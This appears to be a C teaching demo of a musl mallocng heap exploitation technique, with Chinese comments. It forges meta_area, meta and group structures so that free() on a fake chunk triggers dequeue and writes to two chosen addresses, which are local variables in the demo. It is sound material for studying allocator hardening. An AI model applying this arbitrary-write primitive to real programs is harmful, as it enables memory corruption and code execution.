#include <stdio.h>
#include <stdlib.h>
#include "musl.h"

int main(){
    

    void *ptr = malloc(0x10);
    struct meta_area* area = get_meta_area(get_meta(ptr));
    unsigned long long secret = area->check;

    void* mmap_space = mmap((void*)0xdeadbeef000, 0x2000, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0);
    struct meta_area* fake_meta_area = mmap_space;
    fake_meta_area->check = secret;

    struct meta* fake_meta = (struct meta*)((unsigned long long) mmap_space + 0x100);
    fake_meta->maplen = 1;
    fake_meta->sizeclass = 7;       // group中保存的chunk大小，这里设置为0x80
    fake_meta->last_idx = 4;        // group中chunk的总数，这里设置为4表示chunk总数为5
    fake_meta->freeable = 1;        // 通过okay_to_free检查

    struct group* fake_group = (struct group*)((unsigned long long) mmap_space + 0x1000);
    fake_meta->mem = fake_group;    // 通过检查1
    fake_group->meta = fake_meta;   // 使group能够找到meta
    fake_meta->avail_mask = 0b11101;// 使nontrivial_free进入if循环，得以执行dequeue

    char* fake_chunk = (char*)((unsigned long long) mmap_space + 0x1000 + 0x10 + 0x80);
    *(unsigned short *)(fake_chunk - 2) = 8;    // offset
    *(unsigned char*)(fake_chunk - 3) = 1;      // index
	
    long long target1 = 0;
    long long target2 = 0;
    fake_meta->prev = (struct meta*)(&target1-1);
    fake_meta->next = (struct meta*)(&target2);

    printf_color(GREEN, UNDEFINED, "释放前，目标地址附近的值：\n");
    printf("%p->%#llx\n%p->%#llx\n", &target1, target1, &target2, target2);
    free(fake_chunk);
    printf_color(GREEN, UNDEFINED, "释放后，目标地址附近的值：\n");
    printf("%p->%#llx\n%p->%#llx\n", &target1, target1, &target2, target2);
    return 0;
}
